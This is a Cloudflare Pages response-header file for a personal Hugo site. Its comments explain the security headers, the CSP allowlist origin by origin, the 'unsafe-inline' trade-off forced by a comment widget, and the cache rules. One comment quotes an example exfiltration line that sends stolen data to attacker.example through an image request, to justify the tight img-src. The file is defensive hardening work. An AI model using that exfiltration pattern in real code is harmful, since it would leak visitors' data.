# Cloudflare Pages response headers.
#
# LIVE since 30 August 2026: www.alexandrehefren.com is served by Cloudflare
# Pages, so these headers are in force. GitHub Pages CANNOT set response
# headers, so the same commit deployed there simply copies this file into
# public/ and ignores it - which is what keeps the fallback host usable
# without a host-specific branch. This is the only host-specific file in the
# repo. If www is ever pointed back at GitHub Pages, these headers silently
# stop applying; that is the fallback working as designed, not a fault.
#
# Every origin below was derived by reading the built site and the EchoThread
# widget bundle, not guessed. See:
#   private/docs/security/2026-08-29_security-audit-hugo-site.md   (F-1, F-5)
#   private/docs/2026-08-29_cloudflare-pages-migration-decision.md

/*
  # --- Uncontroversial. Safe to enforce immediately. ---
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()
  X-Frame-Options: DENY

  # --- CSP: ENFORCING since 30 August 2026. ---
  # It ran as Content-Security-Policy-Report-Only from the Cloudflare cutover
  # until the comment widget had been exercised on the real domain. The widget
  # is the only component making runtime API calls, and its embed key is
  # domain-locked, so it could not run during pre-migration testing on
  # pages.dev - the policy was proven for everything except the part most
  # likely to violate it.
  #
  # Verified before enforcing, on www.alexandrehefren.com served by Cloudflare:
  # the widget rendered in full (composer, formatting, emoji, sort, image
  # upload, signed-in session), the console was clean, and every origin the
  # page actually contacted was already allowed - cdn.echothread.io,
  # api.echothread.io, cdnjs.cloudflare.com, fonts.googleapis.com,
  # googletagmanager.com, region1.google-analytics.com (matches
  # *.google-analytics.com), www.youtube-nocookie.com, pbs.twimg.com.
  # The widget bundle was also read for origins it can reach but did not on
  # that page: api.echothread.io plus youtube / vimeo / twitch / tiktok
  # embeds, all of which frame-src already permits.
  #
  # To roll back, rename this header to Content-Security-Policy-Report-Only.
  #
  # Why each entry is here:
  #   cdn.echothread.io      comment widget script
  #   api.echothread.io      widget API + its hidden auth iframe
  #   cdn.jsdelivr.net       KaTeX js/css/fonts (math posts only)
  #   cdnjs.cloudflare.com   Font Awesome css + its font files
  #   fonts.googleapis.com   Google Fonts stylesheet (@import in main.css)
  #   fonts.gstatic.com      the font files that stylesheet pulls
  #   googletagmanager.com   Google Analytics loader
  #   *.google-analytics.com GA beacons
  #   api.web3forms.com      contact form submission
  #   youtube / vimeo /      link previews the comment widget can embed
  #   twitch / tiktok
  #
  # 'unsafe-inline' is required, and is NOT removable while EchoThread is
  # embedded directly. Two separate reasons, often conflated:
  #
  #   1. OUR inline <script> blocks. Fixable: hash them, or move them into
  #      assets/js/ files. Nonces are impossible on a static site - a nonce
  #      must be unique per response, and this HTML is cached and served
  #      identically to everyone. Hashes are the only route.
  #      (The built site has ZERO inline event handlers of its own as of
  #      30 Aug 2026; the KaTeX onload= is gone. It returns when
  #      projects/backflow is published, since that page does contain maths -
  #      move its call into a script file at that point.)
  #
  #   2. THE WIDGET's inline handlers. Not fixable here. The bundle writes
  #      four inline onerror="..." attributes (avatar and image fallbacks)
  #      into the DOM. Inline event handlers are blocked by script-src
  #      without 'unsafe-inline', and hashes alone do not cover them -
  #      they need 'unsafe-hashes' plus a hash per handler, which would
  #      break on any widget update, silently, with broken avatars.
  #
  # So doing (1) alone buys nothing: 'unsafe-inline' still has to stay for
  # (2). The only real fix is isolating the widget in a cross-origin iframe
  # on a subdomain - a second Pages project, a DNS record, the subdomain
  # registered with EchoThread, and a resize bridge.
  #
  # img-src is deliberately NOT 'https:'. A wildcard there would let a
  # compromised third-party script exfiltrate data with
  #   new Image().src = 'https://attacker.example/?d=' + stolen
  # which would defeat the point of having a CSP at all. The allowlist covers:
  #   api.echothread.io / *.echothread.io   uploaded comment images, avatars
  #   avatars.githubusercontent.com         GitHub sign-in avatars
  #   lh3.googleusercontent.com             Google sign-in avatars
  #   pbs.twimg.com                         Twitter sign-in avatars
  #   i.ytimg.com                           YouTube link-preview thumbnails
  # Known cost: if a commenter links to an arbitrary site, EchoThread renders
  # that site's own og:image as a preview thumbnail, and it will be blocked.
  # The link still works; only the thumbnail is missing. Accepted deliberately.
  # This does not close exfiltration completely - a compromised script can
  # still navigate the page - but it removes the easy channel.
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.echothread.io https://cdn.jsdelivr.net https://www.googletagmanager.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://fonts.googleapis.com; font-src 'self' data: https://fonts.gstatic.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; img-src 'self' data: https://api.echothread.io https://*.echothread.io https://avatars.githubusercontent.com https://lh3.googleusercontent.com https://pbs.twimg.com https://i.ytimg.com; connect-src 'self' https://api.echothread.io https://api.web3forms.com https://www.google-analytics.com https://*.google-analytics.com https://*.analytics.google.com; frame-src https://api.echothread.io https://www.youtube.com https://www.youtube-nocookie.com https://player.vimeo.com https://clips.twitch.tv https://www.tiktok.com; form-action 'self' https://api.web3forms.com; base-uri 'self'; object-src 'none'; frame-ancestors 'none'; upgrade-insecure-requests

# Hugo's generated images carry a content hash in the filename (_hu_<hash>),
# so a changed image gets a new URL and these can be cached hard.
/images/photos/*
  Cache-Control: public, max-age=31536000, immutable

# main.css is NOT fingerprinted, so it must stay short-lived or edits would
# take a year to reach returning visitors.
/css/*
  Cache-Control: public, max-age=3600
